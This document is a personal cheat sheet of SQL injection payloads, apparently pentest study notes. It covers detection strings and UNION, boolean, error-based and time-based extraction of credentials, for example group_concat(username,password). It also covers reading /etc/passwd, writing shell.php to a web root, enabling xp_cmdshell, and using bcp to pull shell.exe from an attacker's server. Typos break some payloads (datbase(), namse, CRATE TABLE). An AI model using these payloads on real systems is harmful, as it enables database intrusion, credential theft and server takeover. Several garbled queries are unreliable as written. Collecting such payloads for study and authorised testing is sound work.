# ----- Detection
# -- Basic
'
"
' OR 1=1
' AND 1=1#
' AND 1=2#
' ORDER BY 100#
') AND 1=2#
;


# -- Double-blind
' and sleep(10)--+-

# -- comments
--
/*
//
%23
--+-

# ----- Discover DMBS type:
    # -- Concatenation String:
        ==> MySQL concatenation operator: 'abc' 'def' 
        ==> MySQL concatenation operator: CONCAT('foo','bar')
        ==> ORACLE concatenation operator: 'abc' || 'def'
        ==> PostgreSQL concatenation operator: 'foo'||'bar'
        ==> MSSQL concatenation operator: 'abc'+'def'

    # -- special function:
        ==> MYSQL: POW(1,1)
        ==> ORACLE: BITAND(1,1)
        ==> MSSQL: SQUARE(1,1)


# ----- Discover DMBS verion:
    ==> MySQL: SELECT @@version
    ==> MSSQL: SELECT @@version
    ==> Oracle: SELECT banner from v$version
    ==> Oracle: SELECT version FROM v$instance
    ==> PostgreSQL: SELECT version()

# ----- Exploit UNION based
    # -- steps:
        1. Detect number of columns
            ' ORDER BY 100 --+- 
        2. prepare SQL statement
            ' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
        3. 

# ------------------------------- start exploit UNION BASED ------------------------------- # 
    # ---------- |detect number of columns| ---------- #
        ' ORDER BY 100 --+-  
            ==> explanation: decreasing the number of column until get of SQL error or return the expected return.  

    # ---------- |preparing SQL statement| ---------- #
    ' UNION SELECT 1,2,3,4,5,6,7#
        ==> explanation: detect which number is reflect into page content

    ' UNION SELECT 1,2,3,4,datbase(),6,7--+-
        ==> explanation: discovering database

    # ---------- |discovering tables inside database| ---------- #
    ' UNION SELECT 1,2,3,4, table_name FROM information_schema.tables where table_schema = 'database_name',6,7#

    # ---------- |discovering column inside column| ---------- #
    ' UNION SELECT 1,2,3,4, column_name FROM information_schema.columns where table_name = 'table_name',6,7#

    # ---------- |LIMIT number of return| ---------- #
    ' UNION SELECT 1,2,3,4, column_name FROM information_schema.columns where table_name = 'table_name' LIMIT 1,2 ,6,7#
        ==> V.I Note: using "LIMIT" in case of limit numbers of return

    # ---------- |Concat returns| ---------- #
    ' UNION SELECT 1,2,3,4, group_concat(username,":",password) from users,6,7 --+-

        ==> V.I Note: you can use UNION ALL SELECT ... OR UNION DINSTINCT
        ==> UNION ALL SELECT to retrieve all data even if duplicated.
        ==> DINSTINCT to retrieve non-repeated data and UNION by deafult use it.
# -------------------------------   end exploit UNION BASED ------------------------------- # 

# ------------------------------- start exploit BOOLEAN BASED ------------------------------- # 
    # ---------- |detect one character only| ---------- #
        ' OR substr(user(),1,1)='a
        ' OR substr(user(),1,1)='b

        ' AND substr((SELECT length(username) from users limit 0,1),1,1)=4      
            ==> explanation: retrieve the first byte of username length and compare it with 4 bytes
        
        ' AND substr((SELECT username from),1,1)='a'--+-
        
        ASCII(UPPER(SUBSTRING((<query>),<position>,1))) = ASCII(SUBSTRING(<query>,<position>,1))
            ==> explanation: to reduce the number of probability we need to find out if the character is [A-Z] or [a-z] or [1-9]        
# -------------------------------   end exploit BOOLEAN BASED ------------------------------- # 

# ------------------------------- start exploit Error-Based ------------------------------- # 
    # ---------- |exploitation for MYSQL| ---------- #
        -1' concat(version(), floor(rand(0)*2)) AS x from information_schema.tables group by x--+-
            ==> explanation: trying to retrieve DB version through error message.

    # ---------- |Cast tehchnique for MSSQL| ---------- #
        99999 or 1 in (SELECT TOP 1 CAST(@@version AS VARCHAR(4096)))--+-
            ==> explanation: first condition is false, second one is true and try to retrieve database version.

        99999 or 1 in (SELECT TOP 1 CAST(user_name() AS VARCHAR(4096)))--+-
            ==> explanation: get current username. 

        99999 or 1 in (SELECT TOP 1 CAST(db_name(0) AS VARCHAR(4096)))--+-
            ==> explanation: iteration to get all database names through change argument value. 

        99999 or 1 in (SELECT TOP 1 CAST(namse AS VARCHAR(4096)) FROM usrmanagement..sysobjects WHERE xtype='U')
            ==> explanation: retrieve the name of first table that exist in usrmanagement database.

        99999 or 1 in (SELECT TOP 1 CAST(namse AS VARCHAR(4096)) FROM usrmanagement..sysobjects WHERE xtype='U' AND name NOT IN('clients'))
            ==> explanation: retrieve name of the second table and using NOT IN for iteration.
        99999 or 1 in (SELECT TOP 1 CAST(namse AS VARCHAR(4096)) FROM usrmanagement..sysobjects WHERE xtype='U' AND name NOT IN('clients','products'))

        99999 or 1 in (SELECT TOP 1 CAST(usrmanagement..syscolumns.name AS VARCHAR(4096)) FROM usrmanagement..syscolumns, usrmanagement..sysobjects WHERE usrmanagement..syscolumns.id=usrmanagement..sysobjects.id AND usrmanagement..sysobjects.name='account')
            ==> explanation: trying to retrieve name of first column then using NOT IN for iteration.
        99999 or 1 in (SELECT TOP 1 CAST(usrmanagement..syscolumns.name AS VARCHAR(4096)) FROM usrmanagement..syscolumns, usrmanagement..sysobjects WHERE usrmanagement..syscolumns.id=usrmanagement..sysobjects.id AND usrmanagement..sysobjects.name='account' AND usrmanagement..syscolumns.name NOT IN ('password'))

        99999 or 1 in (SELECT TOP 1 CAST(username+'::'+password AS VARCHAR(4096)) FROM usrmanagement..accounts)
            ==> explanation: retrieve username and password with concatenation and use NOT IN to iteration.
        99999 or 1 in (SELECT TOP 1 CAST(username+'::'+password AS VARCHAR(4096)) FROM usrmanagement..accounts WHERE username NOT IN ('Administartor'))

    # ---------- |Cast tehchnique for PostgreSQL| ---------- #
        ==> Quick View: We can using CAST technique for MSSQL

    ==> V.I Note: Cast tehchnique usually used in error-based tehchnique.
# -------------------------------   end exploit Error-Based ------------------------------- # 

# ------------------------------- start exploit Double-blind based ------------------------------- # 
    ' AND if((select+databse())='security',sleep(10),NULL)--+-

    # ---------- |exploit double-blind based with boolean tehchnique| ---------- #
        # ---------- |exploit for MYSQL| ---------- #
            ' AND if((substr((length(select+database())),1,1))=4,sleep(10),NULL)--+-
                ==> explanation: retrieve the length of database name

            ' AND if((substr((select+database()),1,1))='a',sleep(10),NULL)--+-
                ==> explanation: try to figure out the first character of database's name
            
            IF EXISTS (SELECT * FROM users WHERE username = 'armando') BENCHMARK(10000000,MD5(1))
                ==> explanation: if exists function return is true, benchmark will perform MD5 function 10000000 times. That could be affect server load.        

    # ---------- |exploit for MSSQL| ---------- #
        ' AND if (SELECT user) = 'savalue' waitfor delay '0:0:5'
            ==> explanation: if return value is equal to 'sa' the response will delay for 5 seconds.
# -------------------------------   end exploit Double-blind based ------------------------------- # 

# ------------------------------- start exploit read/write files ------------------------------- # 
    # ---------- |exploit: MYSQL - read files| ---------- #
        UNION SELECT 1,2,load_file(/etc/passwd),4#
        
        SELECT HEX(LOAD_FILE('text_file_path'))#
            ==> explanation: read a binary file can use it together with the HEX function.

        CRATE TABLE temptable (output longtext);
        LOAD DATA INFILE '/etc/passwd' INTO TABLE temptable FIELDS TERMINATED BY '\n' (output);
            ==> explanation: parse the content of a file and store one record form another.

    # ---------- |exploit: MYSQL - upload files| ---------- #
        ' UNION SELECT 1,2,3,'padding content'  ,INTO OUTFILE '/var/www/multiude/shell.php',6,7#

        SELECT <fields> FROM <table> INTO DUMPFILE '<output_file_path>';
            ==> explanation: this statement use to write the result of a quiert to a file. this can be used to download huge query result.

    # ----------- |exploit: MSSQL - Read directories| ----------- #
        EXEC master..xp_cmdshell 'dir c:\ > C:\inetpub\wwwroot\site\dir.txt'--+-
            ==> explanation: read the directory then save the output into readable file.

    # ----------- |exploit: MSSQL - read files| ----------- #
        CREATE TABLE filecontent(line VARCHAR(8000));
        BULK INSERT filecontent FROM 'target file';
            ==> explanation: 
                # read a file on the server and then put its content into a table called filecontent. 
                # drop the table after exfiltration of data.


    # ----------- |exploit: MSSQL - upload files| ----------- #
        CREATE TABLE HelperTable (file text)
        BULK INSERT HelperTable FROM 'shell.exe' WITH (codepage='RAW')

        EXEC xp_cmdshell 'bcp "SELECT * FROM HelperTable" queryout shell.exe -c -Craw -S<our_server_adderss> -U<our_server_user>-P<our_server_password>'
            ==> explanation : enforce the target DB server to retrieve the file from our server.
# -------------------------------   end exploit read/write files ------------------------------- # 

# ------------------------------- start exploit system takeover ------------------------------- # 
    # ----------- |exploit: system takeover MSSQL| ----------- #
        EXEC master..xp_cmdshell '<command>'
            ==> explanation:
                # execute command on OS directly if xp_cmdshell is enabled.
                # xp_cmdshell is required sa privileges.

        EXEC sp_configure 'show advanced options',1;
        RECONFIGURE;
        EXEC sp_configure 'xp_cmdshell',1;
        RECONFIGURE;
            ==> explanation: 4 commands above to enable xp_cmdshell.

        EXEC sp_configure 'xp_cmdshell',0;
        EXEC sp_configure 'show advanced options',0;
        RECONFIGURE;
            ==> explanation: 3 commands above to disable xp_cmdshell.

    # ----------- |exploit: MSSQL - ping and port scanner| ----------- #
        EXEC master..xp_cmdshell 'ping 10.10.10.161'

        SELECT * FROM OPENROWSET('SQLOLEDB','uid=sa;pwd=something;Network=DBMSSOCN;Address<target_ip>,<target_port>;timeout=<connection_timeout_in_second>','select 1')--+-
            ==> explanation:
                # if the port is closed, response= SQL server does not exist or access denied.
                # if the port is opened, response= General network error OR Check your network documentation.
                # if error are hidden and the port is closed the connection will timeout according to the value of connect timeout.
    
    # ----------- |exploit: MYSQL - execute OS command| ----------- #
        sys_eval(<'command'>)
        sys_exec(<'command'>)

            ==> Note: to execute the both command we need to extend the functionality of MYSQL by upload shared object (SO) on unix, or dynamic-link library (DLL)
            PTP --> slide 272 to 275 resources.
# -------------------------------   end exploit system takeover ------------------------------- # 

Resources URLS:
Cheat Sheet
https://portswigger.net/web-security/sql-injection/cheat-sheet
http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet